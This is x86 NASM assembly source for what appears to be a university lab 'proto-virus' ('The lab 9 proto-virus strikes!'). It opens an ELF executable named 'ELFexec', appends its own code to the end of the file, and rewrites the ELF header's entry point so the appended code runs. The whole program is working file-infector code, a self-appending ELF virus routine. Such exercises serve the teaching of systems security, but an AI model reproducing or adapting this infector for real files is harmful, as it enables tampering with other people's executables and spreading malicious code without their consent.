%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define ELFHDR_size 52
%define ELFHDR_phoff	28
%define FD dword [ebp-4]
%define ELF_header ebp-56
%define FIleSize dword [ebp-60]
%define original_entry_point ebp-64

	global _start

	section .text
_start:	
	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage

	.open_file:
    mov ebx, FileName           ; Set filename
    open ebx,RDWR, 0x777
    mov FD, eax					;save the file descriptor
    cmp FD, -1
    je FD_Error

	.check_if_ELF:
    lea ecx, [ELF_header]
    read FD,ecx,52			;read 52 first byte (header size of ELF)
    cmp dword [ELF_header], 0x464C457F ; compare the first 4 bytes of the file to check if is ELF
    jne Not_Elf


	.write_the_virus:
    lseek FD, 0 ,SEEK_END 				;set the file pointer to the end of the file
    mov FIleSize, eax
    call get_my_loc
	sub ecx, next_i
    add ecx, _start.show_virus
    mov edx , virus_end-_start.show_virus
    write FD,ecx,edx					;write the content of this script to the end of the file

	.change_entry_point:
	mov eax, 0x8048000					; ELF base address
	add eax, FIleSize
	mov dword [ELF_header+ENTRY], eax
	lseek FD, 0, SEEK_SET 				
	lea ecx, [ELF_header]				;store the memory offset
	write FD,ecx,52						;write the modified header back to the file
	
	close FD
	
	.show_virus:
	call print_virus

    call VirusExit
	

Not_Elf:
    close FD
	call get_my_loc
	sub ecx, next_i
	add ecx, Failstr
    write 1, ecx, 11
    exit 0


FD_Error:
		exit -1


VirusExit:
       exit 0               ; Termination if all is OK and no previous code to jump to
                            ; (also an example for use of above macros)
	
FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:    db "perhaps not", 10 , 0
	
print_virus:
	call get_my_loc
	sub ecx, next_i
	add  ecx, OutStr
	write 1, ecx, 32
	ret
get_my_loc:
	call next_i
next_i:
	pop ecx
	ret	
PreviousEntryPoint: dd VirusExit
virus_end:


